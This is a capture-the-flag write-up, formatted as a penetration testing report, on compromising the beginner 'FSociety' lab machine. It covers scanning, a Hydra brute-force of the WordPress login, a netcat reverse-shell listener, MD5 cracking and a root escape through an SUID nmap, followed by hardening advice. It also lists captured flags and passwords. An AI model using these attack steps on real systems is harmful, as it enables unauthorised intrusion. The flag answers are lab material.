# Penetration Testing Report - FSociety Machine

![FSociety](https://img.shields.io/badge/Level-Beginner-green) ![Platform](https://img.shields.io/badge/Platform-Linux-red) ![Category](https://img.shields.io/badge/Category-CTF-blue)

## Table of Contents
- [Executive Summary](#executive-summary)
- [Methodology](#methodology)
- [Reconnaissance](#reconnaissance)
- [Exploitation](#exploitation)
- [Post-Exploitation](#post-exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Conclusion](#conclusion)
- [Lessons Learned](#lessons-learned)
- [Recommendations](#recommendations)

## Executive Summary

**Target Machine**: FSociety  
**IP Address**: 10.10.236.194  
**Operating System**: Ubuntu 20.04.6 LTS  
**Difficulty Level**: Beginner/Intermediate  
**Objective**: Obtain all three flags (key-1-of-3.txt, key-2-of-3.txt, key-3-of-3.txt)

**Overall Risk Level**: HIGH  
**Compromise Status**: FULLY COMPROMISED (Root access achieved)

## Methodology

This penetration test followed a structured approach:
1. **Information Gathering** - Network scanning and service enumeration
2. **Vulnerability Analysis** - Identifying weaknesses in web applications
3. **Exploitation** - Gaining initial foothold
4. **Post-Exploitation** - Lateral movement and data collection
5. **Privilege Escalation** - Obtaining root privileges

## Reconnaissance

### Network Scanning

Initial TCP SYN scan performed using Nmap:

```bash
sudo nmap -sS 10.10.236.194 -A -O -script vuln -p 22,80,443
```

**Findings:**
- **Port 22/SSH**: OpenSSH 8.2p1 Ubuntu (filtered initially, later found open)
- **Port 80/HTTP**: Apache httpd service running
- **Port 443/HTTPS**: Apache with SSL/TLS encryption

### Web Application Enumeration

#### Directory Bruteforcing with Gobuster
```bash
gobuster dir -u https://10.10.236.194/ -w /usr/share/wordlists/dirb/big.txt -x php,txt -k
```

**Critical Discoveries:**
- `/wp-admin/` - WordPress administration panel
- `/wp-login.php` - WordPress login page
- `/robots.txt` - Revealed website structure
- `/xmlrpc.php` - XML-RPC interface enabled (attack vector)
- `/admin/` - Potential administrative access point

#### WordPress Security Assessment with WPScan
```bash
wpscan --url http://10.10.236.194/ --enumerate --api-token [REDACTED]
```

**Vulnerability Analysis:**
- **WordPress Version**: 4.3.1 (outdated, 115 known vulnerabilities)
- **Theme**: Twenty Fifteen (version 1.3)
- **XML-RPC Enabled**: Potential brute-force attack vector
- **No plugins detected**: Minimal attack surface

## Exploitation

### WordPress Authentication Bypass

**Attack Vector**: Password brute-force via XML-RPC
**Tool**: Hydra
**Command**: 
```bash
hydra -l elliot -P fs-list 10.10.236.194 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30 -v
```

**Compromised Credentials:**
- **Username**: elliot
- **Password**: ER28-0652

### Initial Foothold

**Method**: Reverse shell deployment through WordPress
**Execution**:
1. Accessed WordPress dashboard with compromised credentials
2. Uploaded malicious payload via theme/plugin editor
3. Established reverse shell connection

```bash
# Attacker machine
nc -lnvp 4444

# Target execution
# Reverse shell payload executed through WordPress
```

**Initial Access Obtained**: User `daemon` with limited privileges

## Post-Exploitation

### System Enumeration

After gaining initial access, performed comprehensive system enumeration:

```bash
# Upgrade to interactive shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Explore file system
cd /home
ls -la
```

**User Directory Structure:**
- `/home/robot/` - Primary user account with interesting files
- `/home/ubuntu/` - Secondary user account (minimal content)

### Lateral Movement to User 'robot'

**Discovery in /home/robot/:**
```bash
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

**MD5 Hash Found:**
```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

**Password Cracking Result:**
- **Hash**: c3fcd3d76192e4007dfb496cca67e13b
- **Plaintext Password**: abcdefghijklmnopqrstuvwxyz

**User Privilege Escalation:**
```bash
su robot
Password: abcdefghijklmnopqrstuvwxyz
```

**Flag 2 Captured:**
```bash
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

## Privilege Escalation

### SUID Binary Analysis

Comprehensive search for misconfigured SUID binaries:

```bash
find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null
```

**Critical Finding:**
- `/usr/local/bin/nmap` - Version 3.81 with interactive mode

### Nmap Privilege Escalation Exploitation

**Vulnerability**: Legacy nmap version with interactive mode allowing shell escape
**Exploitation Steps:**
```bash
nmap --interactive
Starting nmap V. 3.81
nmap> !sh
root@ip-10-10-236-194:/home/robot#
```

**Root Access Achieved**

### Final Flag Capture

```bash
cd /root
ls -la
cat key-3-of-3.txt
```

**Root Flag Obtained:**
```
04787ddef27c3dee1ee161b21670b4e4
```

## Conclusion

The FSociety machine was successfully compromised through a methodical penetration testing approach. The attack path demonstrates a classic web application to root compromise scenario:

### Attack Chain Summary:
1. **Reconnaissance** → WordPress identification and vulnerability assessment
2. **Exploitation** → WordPress admin access via password brute-force
3. **Initial Access** → Reverse shell deployment through web application
4. **Lateral Movement** → Password hash cracking and user privilege escalation
5. **Privilege Escalation** → SUID binary exploitation to gain root access

### Flags Captured:
- **Key 2 of 3**: `822c73956184f694993bede3eb39f959` (User robot)
- **Key 3 of 3**: `04787ddef27c3dee1ee161b21670b4e4` (Root)

## Lessons Learned

### Security Vulnerabilities Identified

1. **Outdated Software Components**
   - WordPress 4.3.1 with 115 known vulnerabilities
   - Nmap 3.81 with dangerous SUID permissions

2. **Weak Authentication Mechanisms**
   - Predictable WordPress credentials
   - MD5 password storage (easily crackable)

3. **Misconfigured Permissions**
   - World-readable password hashes
   - Dangerous SUID binaries

4. **Inadequate Security Controls**
   - No brute-force protection on WordPress login
   - Lack of file integrity monitoring

### Technical Insights

- **WordPress Security**: Regular updates are crucial for security
- **Password Management**: Strong hashing algorithms (bcrypt) should be used
- **Principle of Least Privilege**: SUID binaries should be minimized
- **Network Segmentation**: Web applications should be properly isolated

## Recommendations

### Immediate Actions
1. Update WordPress to the latest version
2. Change all user passwords using strong, unique credentials
3. Remove or update vulnerable nmap installation
4. Implement fail2ban or similar brute-force protection

### Long-term Security Improvements
1. **Access Control**
   - Regular SUID binary audits
   - Implement proper file permissions
   - Use privilege separation where possible

2. **Monitoring & Logging**
   - Implement intrusion detection systems
   - Enable comprehensive logging
   - Regular security audits

3. **Security Hardening**
   - Disable unnecessary services
   - Implement application whitelisting
   - Regular vulnerability assessments

### Defense-in-Depth Strategies
1. Web Application Firewall (WAF) implementation
2. Multi-factor authentication for administrative access
3. Regular security patching schedule
4. Employee security awareness training

---
**Report Generated By**: Hannibal  
**Date**: September 26, 2025  
**Purpose**: Educational penetration testing exercise  
**Note**: This report contains information about security vulnerabilities for educational purposes only.
